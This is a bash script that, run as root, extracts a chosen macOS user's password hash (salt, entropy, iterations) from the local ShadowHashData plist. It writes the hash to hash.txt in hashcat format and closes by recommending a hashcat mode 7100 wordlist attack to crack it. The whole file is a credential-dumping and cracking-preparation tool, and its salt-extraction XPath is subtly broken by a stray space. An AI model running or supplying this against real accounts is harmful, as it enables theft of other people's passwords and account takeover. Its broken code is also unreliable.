#!/bin/bash

set -euo pipefail

# Usage check
if [[ $# -ne 1 ]]; then
    echo "Usage: $0 <username>"
    echo "Example: $0 john"
    exit 1
fi

USERNAME="$1"
USER_PLIST="/var/db/dslocal/nodes/Default/users/${USERNAME}.plist"

# Check file exists
if [[ ! -f "$USER_PLIST" ]]; then
    echo "Error: User plist not found at $USER_PLIST"
    exit 1
fi

# Check running as root
if [[ $EUID -ne 0 ]]; then
    echo "Error: This script must be run as root (sudo)"
    exit 1
fi

echo "[*] Reading ShadowHashData for user: $USERNAME"

# Extract the raw ShadowHashData bytes and pipe directly into plutil to decode
# the nested binary plist. plutil -extract outputs base64 for data values.
SHADOW_B64=$(plutil -extract ShadowHashData xml1 -o - "$USER_PLIST" \
    | xmllint --xpath "string(//data)" - \
    | tr -d ' \t\n')

if [[ -z "$SHADOW_B64" ]]; then
    echo "Error: Could not read ShadowHashData from $USER_PLIST"
    exit 1
fi

echo "[*] Raw ShadowHashData (base64, truncated):"
echo "    ${SHADOW_B64:0:80}..."

echo ""
echo "[*] Decoding ShadowHashData to XML plist..."

# Decode base64 and convert the nested binary plist to XML
SHADOW_PLIST=$(echo "$SHADOW_B64" | base64 -D | plutil -convert xml1 - -o -)

echo "[*] Decoded plist:"
echo "$SHADOW_PLIST" | sed 's/^/    /'

# Extract the SALTED-SHA512-PBKDF2 dict
PBKDF2_BLOCK=$(echo "$SHADOW_PLIST" | \
    xmllint --xpath \
        "//key[text()='SALTED-SHA512-PBKDF2']/following-sibling::dict[1]" \
        - 2>/dev/null)

if [[ -z "$PBKDF2_BLOCK" ]]; then
    echo "Error: No SALTED-SHA512-PBKDF2 entry found. Legacy hash type may not be supported."
    exit 1
fi

echo ""
echo "[*] Extracting salt, entropy, and iterations..."

ENTROPY_B64=$(echo "$PBKDF2_BLOCK" | \
    xmllint --xpath "string(//key[text()='entropy']/following-sibling::data[1])" - \
    | tr -d ' \t\n')

SALT_B64=$(echo "$PBKDF2_BLOCK" | \
    xmllint --xpath "string(//key[text()='salt']/following-s  ibling::data[1])" - \
    | tr -d ' \t\n')

ITERATIONS=$(echo "$PBKDF2_BLOCK" | \
    xmllint --xpath "string(//key[text()='iterations']/following-sibling::integer[1])" - \
    | tr -d ' \t\n')

if [[ -z "$ENTROPY_B64" || -z "$SALT_B64" || -z "$ITERATIONS" ]]; then
    echo "Error: Failed to extract one or more hash fields."
    exit 1
fi

echo "[+] Entropy (base64): $ENTROPY_B64"
echo "[+] Salt    (base64): $SALT_B64"
echo "[+] Iterations:       $ITERATIONS"

echo ""
echo "[*] Converting salt and entropy from base64 to hex..."

SALT_HEX=$(echo "$SALT_B64" | base64 -D | xxd -p | tr -d '\n')
ENTROPY_HEX=$(echo "$ENTROPY_B64" | base64 -D | xxd -p | tr -d '\n')

echo "[+] Salt    (hex): $SALT_HEX"
echo "[+] Entropy (hex): $ENTROPY_HEX"

HASH_LINE="\$ml\$${ITERATIONS}\$${SALT_HEX}\$${ENTROPY_HEX}"
echo "$HASH_LINE" >> hash.txt

echo ""
echo "[+] Done! Hash written to hash.txt"
echo "[+] Hash line:"
echo "    $HASH_LINE"
echo ""
echo "[*] Use hashcat mode -m 7100 (macOS PBKDF2-SHA512)"
echo "    Example: hashcat -m 7100 hash.txt wordlist.txt"
